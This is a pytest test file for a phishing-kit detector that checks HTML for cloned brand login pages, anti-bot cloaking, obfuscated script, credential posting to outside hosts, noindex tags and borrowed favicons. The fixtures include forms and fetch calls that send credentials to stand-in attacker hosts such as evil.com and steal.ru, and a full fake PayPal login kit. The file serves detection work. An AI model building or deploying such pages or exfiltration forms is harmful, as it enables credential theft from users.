# test_phishing_kit_detector.py — Cyber Port / phishing-surface-monitor
#
# Pytest test suite for analyzers.phishing_kit_detector
#
# Creative Commons Attribution 4.0 International (CC BY 4.0)
# https://creativecommons.org/licenses/by/4.0/
# Copyright (c) 2026 hiagokinlevi — Cyber Port

import sys
import os

# Ensure the project root is on the path so the analyzers package is importable
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from analyzers.phishing_kit_detector import (
    PKITFinding,
    PKITResult,
    analyze,
    analyze_many,
    _CHECK_WEIGHTS,
)

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _fired(result: PKITResult, check_id: str) -> bool:
    """Return True if *check_id* is present in *result* findings."""
    return any(f.check_id == check_id for f in result.findings)


def _finding(result: PKITResult, check_id: str):
    """Return the PKITFinding for *check_id*, or None."""
    for f in result.findings:
        if f.check_id == check_id:
            return f
    return None


# ---------------------------------------------------------------------------
# PKIT-001: Cloned legitimate login page indicators
# ---------------------------------------------------------------------------

class TestPKIT001:

    def test_paypal_brand_in_title_with_password(self):
        html = "<html><title>PayPal Login</title><input type='password'></html>"
        r = analyze(html)
        assert _fired(r, "PKIT-001")

    def test_microsoft_brand_in_title_with_password(self):
        html = "<html><title>Microsoft Account Sign In</title><input type=\"password\"></html>"
        r = analyze(html)
        assert _fired(r, "PKIT-001")

    def test_google_brand_in_img_alt_with_password(self):
        html = "<html><img alt='Google Logo'><form><input type='password'></form></html>"
        r = analyze(html)
        assert _fired(r, "PKIT-001")

    def test_apple_brand_in_title_with_password(self):
        html = "<title>Apple ID - Sign In</title><input type='password'>"
        r = analyze(html)
        assert _fired(r, "PKIT-001")

    def test_amazon_brand_in_title_with_password(self):
        html = "<title>Amazon Sign-In</title><input type='password'>"
        r = analyze(html)
        assert _fired(r, "PKIT-001")

    def test_netflix_brand_in_img_alt_with_password(self):
        html = "<img alt='Netflix logo'><input type='password'>"
        r = analyze(html)
        assert _fired(r, "PKIT-001")

    def test_facebook_brand_in_title_with_password(self):
        html = "<title>Facebook Login</title><input type='password'>"
        r = analyze(html)
        assert _fired(r, "PKIT-001")

    def test_instagram_brand_in_title_with_password(self):
        html = "<title>Instagram Login</title><input type='password'>"
        r = analyze(html)
        assert _fired(r, "PKIT-001")

    def test_twitter_brand_in_img_alt_with_password(self):
        html = "<img alt='Twitter'><input type='password'>"
        r = analyze(html)
        assert _fired(r, "PKIT-001")

    def test_chase_brand_in_title_with_password(self):
        html = "<title>Chase Online Banking</title><input type='password'>"
        r = analyze(html)
        assert _fired(r, "PKIT-001")

    def test_wells_fargo_in_title_with_password(self):
        html = "<title>Wells Fargo Sign On</title><input type='password'>"
        r = analyze(html)
        assert _fired(r, "PKIT-001")

    def test_bank_of_america_in_title_with_password(self):
        html = "<title>Bank of America Login</title><input type='password'>"
        r = analyze(html)
        assert _fired(r, "PKIT-001")

    def test_citibank_in_title_with_password(self):
        html = "<title>Citibank Online</title><input type='password'>"
        r = analyze(html)
        assert _fired(r, "PKIT-001")

    def test_brand_in_title_case_insensitive(self):
        # Uppercase brand should still trigger
        html = "<title>PAYPAL SECURE LOGIN</title><input type='password'>"
        r = analyze(html)
        assert _fired(r, "PKIT-001")

    def test_brand_in_title_no_password_field(self):
        # Brand present but no password input — should NOT fire
        html = "<title>PayPal Help Centre</title><input type='text'>"
        r = analyze(html)
        assert not _fired(r, "PKIT-001")

    def test_password_field_no_brand(self):
        # Password field present but no brand keyword — should NOT fire
        html = "<title>My Custom Login</title><input type='password'>"
        r = analyze(html)
        assert not _fired(r, "PKIT-001")

    def test_empty_html_no_pkit001(self):
        r = analyze("")
        assert not _fired(r, "PKIT-001")

    def test_password_type_double_quotes(self):
        html = '<title>Google account</title><input type="password">'
        r = analyze(html)
        assert _fired(r, "PKIT-001")

    def test_evidence_contains_brand_and_password_confirmation(self):
        html = "<title>PayPal Secure</title><input type='password'>"
        r = analyze(html)
        f = _finding(r, "PKIT-001")
        assert f is not None
        evidence_str = " ".join(f.evidence).lower()
        assert "paypal" in evidence_str
        assert "password" in evidence_str

    def test_weight_is_45(self):
        html = "<title>PayPal</title><input type='password'>"
        r = analyze(html)
        f = _finding(r, "PKIT-001")
        assert f is not None
        assert f.weight == 45

    def test_severity_is_critical(self):
        html = "<title>PayPal</title><input type='password'>"
        r = analyze(html)
        f = _finding(r, "PKIT-001")
        assert f is not None
        assert f.severity == "CRITICAL"


# ---------------------------------------------------------------------------
# PKIT-002: Cloaking / anti-bot detection code
# ---------------------------------------------------------------------------

class TestPKIT002:

    def test_navigator_webdriver(self):
        html = "<script>if(navigator.webdriver){alert('bot');}</script>"
        r = analyze(html)
        assert _fired(r, "PKIT-002")

    def test_phantom_js_global(self):
        html = "<script>if(window.__PhantomJS__){}</script>"
        r = analyze(html)
        assert _fired(r, "PKIT-002")

    def test_call_phantom(self):
        html = "<script>window.callPhantom && window.callPhantom({});</script>"
        r = analyze(html)
        assert _fired(r, "PKIT-002")

    def test_underscore_phantom(self):
        html = "<script>var p = window._phantom;</script>"
        r = analyze(html)
        assert _fired(r, "PKIT-002")

    def test_selenium_keyword(self):
        html = "<script>if(window.selenium){document.body.innerHTML='';}</script>"
        r = analyze(html)
        assert _fired(r, "PKIT-002")

    def test_bot_in_if_statement(self):
        html = "<script>if (userAgent.indexOf('bot') > -1) { redirect(); }</script>"
        r = analyze(html)
        assert _fired(r, "PKIT-002")

    def test_crawler_in_if_statement(self):
        html = "<script>if(isCrawler(ua)){showFake();}</script>"
        r = analyze(html)
        assert _fired(r, "PKIT-002")

    def test_headless_in_if_statement(self):
        html = "<script>if(window.headless){return;}</script>"
        r = analyze(html)
        assert _fired(r, "PKIT-002")

    def test_bot_detection_pattern(self):
        html = "<script>var botDetection = require('bot-detection');</script>"
        r = analyze(html)
        assert _fired(r, "PKIT-002")

    def test_no_antibot_patterns_clean(self):
        html = "<html><body>Hello world</body></html>"
        r = analyze(html)
        assert not _fired(r, "PKIT-002")

    def test_weight_is_30(self):
        html = "<script>navigator.webdriver</script>"
        r = analyze(html)
        f = _finding(r, "PKIT-002")
        assert f is not None
        assert f.weight == 30

    def test_severity_is_high(self):
        html = "<script>navigator.webdriver</script>"
        r = analyze(html)
        f = _finding(r, "PKIT-002")
        assert f is not None
        assert f.severity == "HIGH"

    def test_evidence_lists_matched_pattern(self):
        html = "<script>navigator.webdriver</script>"
        r = analyze(html)
        f = _finding(r, "PKIT-002")
        assert f is not None
        assert any("webdriver" in e for e in f.evidence)


# ---------------------------------------------------------------------------
# PKIT-003: Data exfiltration via POST to external domain
# ---------------------------------------------------------------------------

class TestPKIT003:

    def test_form_action_absolute_http(self):
        html = "<form action='http://evil.com/steal.php' method='post'><input type='password'></form>"
        r = analyze(html)
        assert _fired(r, "PKIT-003")

    def test_form_action_absolute_https(self):
        html = '<form action="https://attacker.net/collect" method="post"></form>'
        r = analyze(html)
        assert _fired(r, "PKIT-003")

    def test_form_action_relative_not_flagged(self):
        # Relative action is fine — should NOT fire PKIT-003
        html = "<form action='/login' method='post'><input type='password'></form>"
        r = analyze(html)
        assert not _fired(r, "PKIT-003")

    def test_form_action_same_domain_slash_not_flagged(self):
        html = "<form action='submit.php'><input type='password'></form>"
        r = analyze(html)
        assert not _fired(r, "PKIT-003")

    def test_xmlhttprequest_with_external_url(self):
        html = "<script>var x = new XMLHttpRequest(); x.open('POST','https://steal.ru/log');</script>"
        r = analyze(html)
        assert _fired(r, "PKIT-003")

    def test_fetch_with_external_url(self):
        html = "<script>fetch('https://collect.example.org/creds', {method:'POST', body: JSON.stringify(data)});</script>"
        r = analyze(html)
        assert _fired(r, "PKIT-003")

    def test_fetch_no_external_url_not_flagged(self):
        html = "<script>fetch('/api/submit', {method:'POST', body: data});</script>"
        r = analyze(html)
        assert not _fired(r, "PKIT-003")

    def test_weight_is_30(self):
        html = "<form action='https://evil.com/steal'></form>"
        r = analyze(html)
        f = _finding(r, "PKIT-003")
        assert f is not None
        assert f.weight == 30

    def test_severity_is_high(self):
        html = "<form action='https://evil.com/steal'></form>"
        r = analyze(html)
        f = _finding(r, "PKIT-003")
        assert f is not None
        assert f.severity == "HIGH"

    def test_evidence_includes_form_url(self):
        html = "<form action='https://evil.com/steal'></form>"
        r = analyze(html)
        f = _finding(r, "PKIT-003")
        assert f is not None
        assert any("form" in e.lower() for e in f.evidence)

    def test_no_form_no_xhr_clean(self):
        html = "<html><body><p>Clean page</p></body></html>"
        r = analyze(html)
        assert not _fired(r, "PKIT-003")


# ---------------------------------------------------------------------------
# PKIT-004: Redirect to legitimate site after credential capture
# ---------------------------------------------------------------------------

class TestPKIT004:

    def test_window_location_with_paypal(self):
        html = "<script>window.location = 'https://www.paypal.com/login';</script>"
        r = analyze(html)
        assert _fired(r, "PKIT-004")

    def test_location_href_with_microsoft(self):
        html = "<script>location.href = 'https://login.microsoft.com';</script>"
        r = analyze(html)
        assert _fired(r, "PKIT-004")

    def test_location_replace_with_google(self):
        html = "<script>location.replace('https://accounts.google.com');</script>"
        r = analyze(html)
        assert _fired(r, "PKIT-004")

    def test_window_location_with_apple(self):
        html = "<script>window.location='https://appleid.apple.com';</script>"
        r = analyze(html)
        assert _fired(r, "PKIT-004")

    def test_location_href_with_amazon(self):
        html = "<script>location.href='https://www.amazon.com/signin';</script>"
        r = analyze(html)
        assert _fired(r, "PKIT-004")

    def test_redirect_without_brand_domain_not_flagged(self):
        # Redirect present but domain is NOT a known legitimate brand
        html = "<script>window.location = 'https://random-site.com';</script>"
        r = analyze(html)
        assert not _fired(r, "PKIT-004")

    def test_brand_domain_without_redirect_not_flagged(self):
        # Brand domain in a link but no JS redirect
        html = "<a href='https://www.paypal.com'>Visit PayPal</a>"
        r = analyze(html)
        assert not _fired(r, "PKIT-004")

    def test_weight_is_25(self):
        html = "<script>window.location='https://paypal.com';</script>"
        r = analyze(html)
        f = _finding(r, "PKIT-004")
        assert f is not None
        assert f.weight == 25

    def test_severity_is_high(self):
        html = "<script>window.location='https://paypal.com';</script>"
        r = analyze(html)
        f = _finding(r, "PKIT-004")
        assert f is not None
        assert f.severity == "HIGH"

    def test_evidence_contains_domain(self):
        html = "<script>window.location='https://paypal.com';</script>"
        r = analyze(html)
        f = _finding(r, "PKIT-004")
        assert f is not None
        assert any("paypal" in e.lower() for e in f.evidence)

    def test_empty_html_no_pkit004(self):
        r = analyze("")
        assert not _fired(r, "PKIT-004")


# ---------------------------------------------------------------------------
# PKIT-005: Obfuscated JavaScript
# ---------------------------------------------------------------------------

class TestPKIT005:

    def test_eval_call(self):
        html = "<script>eval('alert(1)');</script>"
        r = analyze(html)
        assert _fired(r, "PKIT-005")

    def test_unescape_call(self):
        html = "<script>document.write(unescape('%3Cscript%3E'));</script>"
        r = analyze(html)
        assert _fired(r, "PKIT-005")

    def test_string_from_char_code(self):
        html = "<script>var s=String.fromCharCode(72,101,108,108,111);</script>"
        r = analyze(html)
        assert _fired(r, "PKIT-005")

    def test_atob_call(self):
        html = "<script>var d=atob('SGVsbG8gV29ybGQ=');</script>"
        r = analyze(html)
        assert _fired(r, "PKIT-005")

    def test_base64_long_string_in_script(self):
        # 100-char base64-like string inside a <script> block
        b64 = "A" * 100  # 100 chars of 'A' — valid base64 pattern chars
        html = f"<script>var d='{b64}';</script>"
        r = analyze(html)
        assert _fired(r, "PKIT-005")

    def test_base64_short_string_not_flagged(self):
        # 80 chars — below the 100-char threshold — only this obfuscation present
        b64 = "A" * 80
        html = f"<script>var d='{b64}';</script>"
        r = analyze(html)
        # Only PKIT-005 base64 check; others should not fire
        assert not _fired(r, "PKIT-005")

    def test_base64_outside_script_not_flagged(self):
        # Long base64 string in a <div>, not inside <script>
        b64 = "A" * 120
        html = f"<div>{b64}</div>"
        r = analyze(html)
        assert not _fired(r, "PKIT-005")

    def test_clean_script_not_flagged(self):
        html = "<script>var x = 1 + 2; console.log(x);</script>"
        r = analyze(html)
        assert not _fired(r, "PKIT-005")

    def test_weight_is_25(self):
        html = "<script>eval('x');</script>"
        r = analyze(html)
        f = _finding(r, "PKIT-005")
        assert f is not None
        assert f.weight == 25

    def test_severity_is_high(self):
        html = "<script>eval('x');</script>"
        r = analyze(html)
        f = _finding(r, "PKIT-005")
        assert f is not None
        assert f.severity == "HIGH"

    def test_multiple_obfuscation_techniques_evidence(self):
        html = "<script>eval(atob('SGVs'));</script>"
        r = analyze(html)
        f = _finding(r, "PKIT-005")
        assert f is not None
        assert len(f.evidence) >= 2  # both eval and atob captured

    def test_eval_with_spaces(self):
        # eval  ( with spaces between — still matches
        html = "<script>eval  ('obf');</script>"
        r = analyze(html)
        assert _fired(r, "PKIT-005")

    def test_no_obfuscation_no_fire(self):
        html = "<html><body><p>Just text.</p></body></html>"
        r = analyze(html)
        assert not _fired(r, "PKIT-005")


# ---------------------------------------------------------------------------
# PKIT-006: Anti-indexing techniques
# ---------------------------------------------------------------------------

class TestPKIT006:

    def test_robots_noindex_meta_standard(self):
        html = '<meta name="robots" content="noindex, nofollow">'
        r = analyze(html)
        assert _fired(r, "PKIT-006")

    def test_robots_noindex_meta_single_quotes(self):
        html = "<meta name='robots' content='noindex'>"
        r = analyze(html)
        assert _fired(r, "PKIT-006")

    def test_robots_noindex_reversed_attribute_order(self):
        # content before name
        html = '<meta content="noindex, nofollow" name="robots">'
        r = analyze(html)
        assert _fired(r, "PKIT-006")

    def test_x_robots_tag_http_equiv(self):
        html = '<meta http-equiv="X-Robots-Tag" content="noindex">'
        r = analyze(html)
        assert _fired(r, "PKIT-006")

    def test_x_robots_tag_lowercase(self):
        html = '<meta http-equiv="x-robots-tag" content="noindex">'
        r = analyze(html)
        assert _fired(r, "PKIT-006")

    def test_robots_index_not_flagged(self):
        # "index" without "no" prefix — should NOT fire
        html = '<meta name="robots" content="index, follow">'
        r = analyze(html)
        assert not _fired(r, "PKIT-006")

    def test_no_meta_robots_not_flagged(self):
        html = "<html><head><title>Test</title></head><body></body></html>"
        r = analyze(html)
        assert not _fired(r, "PKIT-006")

    def test_weight_is_15(self):
        html = '<meta name="robots" content="noindex">'
        r = analyze(html)
        f = _finding(r, "PKIT-006")
        assert f is not None
        assert f.weight == 15

    def test_severity_is_medium(self):
        html = '<meta name="robots" content="noindex">'
        r = analyze(html)
        f = _finding(r, "PKIT-006")
        assert f is not None
        assert f.severity == "MEDIUM"

    def test_evidence_contains_pattern(self):
        html = '<meta name="robots" content="noindex">'
        r = analyze(html)
        f = _finding(r, "PKIT-006")
        assert f is not None
        assert len(f.evidence) > 0


# ---------------------------------------------------------------------------
# PKIT-007: Favicon / logo references to legitimate brand
# ---------------------------------------------------------------------------

class TestPKIT007:

    def test_icon_link_paypal_domain(self):
        html = '<link rel="icon" href="https://www.paypal.com/favicon.ico">'
        r = analyze(html)
        assert _fired(r, "PKIT-007")

    def test_shortcut_icon_microsoft(self):
        html = '<link rel="shortcut icon" href="/images/microsoft-favicon.ico">'
        r = analyze(html)
        assert _fired(r, "PKIT-007")

    def test_icon_link_google(self):
        html = '<link rel="icon" href="https://google.com/favicon.ico">'
        r = analyze(html)
        assert _fired(r, "PKIT-007")

    def test_icon_link_apple(self):
        html = '<link rel="icon" href="/static/apple-touch-icon.png">'
        r = analyze(html)
        assert _fired(r, "PKIT-007")

    def test_icon_link_amazon(self):
        html = '<link rel="icon" href="/res/amazon_favicon.ico">'
        r = analyze(html)
        assert _fired(r, "PKIT-007")

    def test_icon_link_netflix(self):
        html = '<link rel="icon" href="/netflix-icon.png">'
        r = analyze(html)
        assert _fired(r, "PKIT-007")

    def test_icon_link_facebook(self):
        html = '<link rel="icon" href="https://facebook.com/favicon.ico">'
        r = analyze(html)
        assert _fired(r, "PKIT-007")

    def test_icon_link_twitter(self):
        html = '<link rel="icon" href="/img/twitter_icon.png">'
        r = analyze(html)
        assert _fired(r, "PKIT-007")

    def test_icon_link_no_brand_not_flagged(self):
        html = '<link rel="icon" href="/favicon.ico">'
        r = analyze(html)
        assert not _fired(r, "PKIT-007")

    def test_stylesheet_link_not_flagged(self):
        # <link rel="stylesheet"> should NOT match the icon pattern
        html = '<link rel="stylesheet" href="https://paypal.com/style.css">'
        r = analyze(html)
        assert not _fired(r, "PKIT-007")

    def test_href_before_rel_attribute_order(self):
        # href appears before rel in the tag
        html = '<link href="/img/paypal_icon.ico" rel="shortcut icon">'
        r = analyze(html)
        assert _fired(r, "PKIT-007")

    def test_weight_is_15(self):
        html = '<link rel="icon" href="/paypal-icon.ico">'
        r = analyze(html)
        f = _finding(r, "PKIT-007")
        assert f is not None
        assert f.weight == 15

    def test_severity_is_medium(self):
        html = '<link rel="icon" href="/paypal-icon.ico">'
        r = analyze(html)
        f = _finding(r, "PKIT-007")
        assert f is not None
        assert f.severity == "MEDIUM"

    def test_evidence_contains_brand(self):
        html = '<link rel="icon" href="/paypal-icon.ico">'
        r = analyze(html)
        f = _finding(r, "PKIT-007")
        assert f is not None
        assert any("paypal" in e.lower() for e in f.evidence)


# ---------------------------------------------------------------------------
# PKITResult data model and scoring
# ---------------------------------------------------------------------------

class TestPKITResult:

    def test_risk_score_zero_for_clean_page(self):
        r = analyze("<html><body><p>Hello world</p></body></html>")
        assert r.risk_score == 0

    def test_kit_detected_false_for_clean_page(self):
        r = analyze("<html><body><p>Hello world</p></body></html>")
        assert r.kit_detected is False

    def test_kit_detected_true_at_45(self):
        # PKIT-001 alone = weight 45 → should trigger kit_detected
        html = "<title>PayPal Login</title><input type='password'>"
        r = analyze(html)
        assert r.risk_score >= 45
        assert r.kit_detected is True

    def test_kit_detected_false_below_45(self):
        # PKIT-006 alone = weight 15, PKIT-007 alone = 15 → total 30, below threshold
        html = (
            '<meta name="robots" content="noindex">'
            '<link rel="icon" href="/paypal_icon.ico">'
        )
        r = analyze(html)
        assert r.risk_score < 45
        assert r.kit_detected is False

    def test_risk_score_capped_at_100(self):
        # Combine several checks that together exceed 100
        # PKIT-001(45) + PKIT-002(30) + PKIT-003(30) = 105 → capped at 100
        html = (
            "<title>PayPal Secure Login</title>"
            "<input type='password'>"
            "<script>navigator.webdriver</script>"
            "<form action='https://evil.com/steal'></form>"
        )
        r = analyze(html)
        assert r.risk_score == 100

    def test_findings_list_is_ordered_by_detection(self):
        html = (
            "<title>PayPal</title><input type='password'>"
            "<script>navigator.webdriver</script>"
        )
        r = analyze(html)
        check_ids = [f.check_id for f in r.findings]
        assert "PKIT-001" in check_ids
        assert "PKIT-002" in check_ids

    def test_url_preserved_in_result(self):
        r = analyze("<p>test</p>", page_url="https://phishing.example.com/login")
        assert r.url == "https://phishing.example.com/login"

    def test_url_defaults_to_empty_string(self):
        r = analyze("<p>test</p>")
        assert r.url == ""

    def test_to_dict_keys(self):
        r = analyze("<title>PayPal</title><input type='password'>")
        d = r.to_dict()
        assert "url" in d
        assert "risk_score" in d
        assert "kit_detected" in d
        assert "findings" in d

    def test_to_dict_findings_is_list_of_dicts(self):
        html = "<title>PayPal</title><input type='password'>"
        r = analyze(html)
        d = r.to_dict()
        assert isinstance(d["findings"], list)
        assert all(isinstance(f, dict) for f in d["findings"])

    def test_to_dict_finding_fields(self):
        html = "<title>PayPal</title><input type='password'>"
        r = analyze(html)
        d = r.to_dict()
        f = d["findings"][0]
        assert "check_id" in f
        assert "severity" in f
        assert "title" in f
        assert "detail" in f
        assert "weight" in f
        assert "evidence" in f

    def test_summary_contains_risk_score(self):
        html = "<title>PayPal</title><input type='password'>"
        r = analyze(html)
        s = r.summary()
        assert str(r.risk_score) in s

    def test_summary_contains_kit_detected_label(self):
        html = "<title>PayPal</title><input type='password'>"
        r = analyze(html)
        s = r.summary()
        assert "KIT DETECTED" in s

    def test_summary_clean_page(self):
        r = analyze("<html><body>clean</body></html>")
        s = r.summary()
        assert "clean" in s.lower()

    def test_by_severity_groups_correctly(self):
        html = (
            "<title>PayPal</title><input type='password'>"  # CRITICAL
            '<meta name="robots" content="noindex">'         # MEDIUM
        )
        r = analyze(html)
        groups = r.by_severity()
        assert "CRITICAL" in groups
        assert "MEDIUM" in groups
        assert all(isinstance(v, list) for v in groups.values())

    def test_no_findings_to_dict_empty_list(self):
        r = analyze("")
        d = r.to_dict()
        assert d["findings"] == []

    def test_check_weights_dict_has_all_seven_checks(self):
        expected = {"PKIT-001", "PKIT-002", "PKIT-003", "PKIT-004",
                    "PKIT-005", "PKIT-006", "PKIT-007"}
        assert set(_CHECK_WEIGHTS.keys()) == expected


# ---------------------------------------------------------------------------
# analyze_many
# ---------------------------------------------------------------------------

class TestAnalyzeMany:

    def test_returns_list_of_results(self):
        pages = [
            {"html_content": "<p>clean</p>", "url": "https://a.com"},
            {"html_content": "<title>PayPal</title><input type='password'>", "url": "https://b.com"},
        ]
        results = analyze_many(pages)
        assert isinstance(results, list)
        assert len(results) == 2

    def test_preserves_order(self):
        pages = [
            {"html_content": "<p>first</p>", "url": "https://first.com"},
            {"html_content": "<p>second</p>", "url": "https://second.com"},
        ]
        results = analyze_many(pages)
        assert results[0].url == "https://first.com"
        assert results[1].url == "https://second.com"

    def test_url_optional_in_page_dict(self):
        pages = [{"html_content": "<p>no url key</p>"}]
        results = analyze_many(pages)
        assert results[0].url == ""

    def test_empty_list_returns_empty(self):
        results = analyze_many([])
        assert results == []

    def test_each_result_is_pkitresult(self):
        pages = [{"html_content": "<p>test</p>"}]
        results = analyze_many(pages)
        assert isinstance(results[0], PKITResult)

    def test_kit_detected_in_one_page(self):
        pages = [
            {"html_content": "<p>clean</p>"},
            {"html_content": "<title>PayPal</title><input type='password'>"},
        ]
        results = analyze_many(pages)
        assert not results[0].kit_detected
        assert results[1].kit_detected


# ---------------------------------------------------------------------------
# Combined / full-kit scenario tests
# ---------------------------------------------------------------------------

class TestCombinedScenarios:

    def test_full_phishing_kit_scenario(self):
        """All 7 checks fire on a carefully crafted phishing kit HTML."""
        html = """<!DOCTYPE html>
<html>
<head>
  <title>PayPal Secure Login</title>
  <meta name="robots" content="noindex, nofollow">
  <link rel="shortcut icon" href="https://www.paypal.com/favicon.ico">
</head>
<body>
  <img alt="PayPal Logo" src="/img/logo.png">
  <form action="https://evil-collector.ru/harvest.php" method="post">
    <input type="email" name="email">
    <input type="password" name="pwd">
    <button type="submit">Log In</button>
  </form>
  <script>
    if (navigator.webdriver) { document.body.innerHTML = 'Access Denied'; }
    eval(atob('YWxlcnQoJ2hpJyk='));
    window.location = 'https://www.paypal.com/myaccount';
  </script>
</body>
</html>"""
        r = analyze(html, "https://totally-not-paypal.com/login")

        # All 7 checks should fire
        for check_id in ["PKIT-001", "PKIT-002", "PKIT-003", "PKIT-004",
                         "PKIT-005", "PKIT-006", "PKIT-007"]:
            assert _fired(r, check_id), f"{check_id} did not fire"

        # Risk score capped at 100
        assert r.risk_score == 100
        assert r.kit_detected is True

    def test_clean_login_page_no_detections(self):
        """A legitimate-looking login page with no phishing indicators."""
        html = """<!DOCTYPE html>
<html>
<head>
  <title>My App - Sign In</title>
  <link rel="icon" href="/favicon.ico">
</head>
<body>
  <form action="/api/login" method="post">
    <input type="email" name="email" placeholder="Email">
    <input type="password" name="pwd" placeholder="Password">
    <button type="submit">Sign In</button>
  </form>
  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      fetch('/api/login', { method: 'POST', body: new FormData(e.target) });
    });
  </script>
</body>
</html>"""
        r = analyze(html, "https://myapp.example.com/login")
        assert r.risk_score == 0
        assert r.kit_detected is False
        assert r.findings == []

    def test_partial_kit_only_obfuscation_and_noindex(self):
        """Kit has obfuscation + noindex but no cloned brand — sub-threshold."""
        html = (
            "<head><meta name='robots' content='noindex'></head>"
            "<script>eval('malicious()');</script>"
        )
        r = analyze(html)
        # PKIT-005=25, PKIT-006=15 → total 40 → below 45 threshold
        assert r.risk_score == 40
        assert r.kit_detected is False

    def test_brand_redirect_and_obfuscation_fires_kit(self):
        """Redirect + obfuscation crosses the kit detection threshold."""
        # PKIT-004=25, PKIT-005=25 → total 50 → kit detected
        html = (
            "<script>"
            "eval('payload');"
            "window.location='https://www.paypal.com';"
            "</script>"
        )
        r = analyze(html)
        assert _fired(r, "PKIT-004")
        assert _fired(r, "PKIT-005")
        assert r.risk_score >= 45
        assert r.kit_detected is True

    def test_result_to_dict_round_trip(self):
        html = "<title>Microsoft Sign In</title><input type='password'>"
        r = analyze(html, "https://fake-ms.com")
        d = r.to_dict()
        assert d["url"] == "https://fake-ms.com"
        assert d["kit_detected"] is True
        assert d["risk_score"] == 45
        assert len(d["findings"]) == 1
        assert d["findings"][0]["check_id"] == "PKIT-001"
